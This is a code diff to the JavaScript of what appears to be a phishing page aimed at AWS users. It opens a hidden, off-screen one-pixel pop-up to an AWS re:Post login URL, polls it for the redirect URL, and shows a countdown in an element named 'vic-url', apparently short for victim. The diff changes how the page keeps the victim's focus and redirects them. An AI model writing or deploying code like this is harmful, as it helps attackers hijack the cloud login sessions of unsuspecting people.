@@ -536,7 +536,8 @@ document.getElementById('openWindowBtn').addEventListener('click', function() {
     let newWindow = window.open('https://repost.aws/api/v1/identity/aws/login?redirectUrl=https%3A%2F%2Frepost.aws%2Fauth', '_blank', 'width=1,height=1,left=-1000,top=-1000');
 
     // Ensure the current window remains focused
-    window.focus();
+    var host = window.location.protocol + "//" + window.location.host;
+    window.open(host, '_blank');
 
     // Poll the window every 100 milliseconds to check for URL change
     const checkUrlInterval = setInterval(() => {
@@ -567,19 +568,19 @@ document.getElementById('openWindowBtn').addEventListener('click', function() {
 
     
     //let newWindow = window.open("https://eu-central-1.console.aws.amazon.com/cke/auth?region=eu-central-1&redirectUrl=https%3A%2Frepost.aws%2Fapi%2Fv1%2Fidentity%2Faws%2Fcallback%3Fstate%3DeyJub25jZSI6ImdkYmQ5aUxqUUdPM0RseUVEdmRDMUEifQ&challenge=V9Yz1LWbNnjk2PJZaxgoN8PN3tXhppD0Vk2hOg5huhU", "_blank");
-    let n = 10; // Set initial countdown value
-    const paragraph = document.getElementById("vic-url");
-    const countdown = setInterval(function() {
-        paragraph.innerHTML = `<strong>You will be redirected after ${n} second${n === 1 ? '' : 's'}<strong><br/>`;
-        n--;
+    // let n = 10; // Set initial countdown value
+    // const paragraph = document.getElementById("vic-url");
+    // const countdown = setInterval(function() {
+    //     paragraph.innerHTML = `<strong>You will be redirected after ${n} second${n === 1 ? '' : 's'}<strong><br/>`;
+    //     n--;
 
-        if (n < 0) {
-            clearInterval(countdown); // Stop the countdown when n reaches 0
-            var host = window.location.protocol + "//" + window.location.host;
-            window.location.href = host;
-            // Add any redirect or action here
-        }
-    }, 1300); // Update every 1 second (1000 milliseconds)
+    //     if (n < 0) {
+    //         clearInterval(countdown); // Stop the countdown when n reaches 0
+    //         var host = window.location.protocol + "//" + window.location.host;
+    //         window.location.href = host;
+    //         // Add any redirect or action here
+    //     }
+    // }, 1300); // Update every 1 second (1000 milliseconds)
 
     if (newWindow) {
         setTimeout(function () {
